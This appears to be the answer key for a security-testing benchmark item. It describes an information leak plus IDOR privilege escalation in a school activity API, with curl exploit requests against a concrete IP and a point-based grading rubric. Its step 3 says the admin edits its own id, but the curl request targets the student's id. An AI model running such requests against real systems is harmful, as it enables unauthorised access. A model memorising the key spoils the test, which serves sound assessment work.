# R02 — Ground Truth

**Type:** R1 — 权限提升链（Information disclosure + IDOR → privilege escalation）

**根因:** 两条链：
1. `/api/users/profile` 返回用户完整信息（包括 `role` 字段），无脱敏
2. `/api/admin/users/:id/role` 端点只检查 `role == 'school_admin' || role == 'college_admin'` 但 college_admin 可以修改自己的 role 为 school_admin

**攻击链:**
```
Step 1: 作为 student 登录 → GET /api/users/profile → 返回 {id, name, role: "student", college_id...}
Step 2: 信息泄露确认 — profile 返回敏感字段 role
Step 3: 作为 college_admin_B → PUT /api/admin/users/{self_id}/role → body: {"role": "school_admin"}
Step 4: 成功提升为 school_admin → 可管理全校所有活动
```

**利用证明:**
```bash
# Step 1: 信息泄露
curl -H "Authorization: Bearer <student_token>" http://139.196.50.134/api/users/profile
# → {"id": 5, "name": "学生A", "role": "student", ...}

# Step 3: 权限提升
curl -X PUT -H "Authorization: Bearer <college_admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "school_admin"}' \
  http://139.196.50.134/api/admin/users/5/role
# → 200 OK (college_admin should NOT be able to set school_admin role)
```

**评分要点:**
- 漏洞分类: R1 权限提升链 (1pt)
- 信息泄露: profile 返回 role 字段 (1pt)
- 权限提升: college_admin → school_admin (2pt)
- 攻击链串联: info leak → privilege escalation (1pt)
- 修复: role字段脱敏 + college_admin不能设置school_admin (1pt)
- 防御建议: 实施最小权限原则 + role修改审计日志 (1pt)
- 链完整 (1pt)
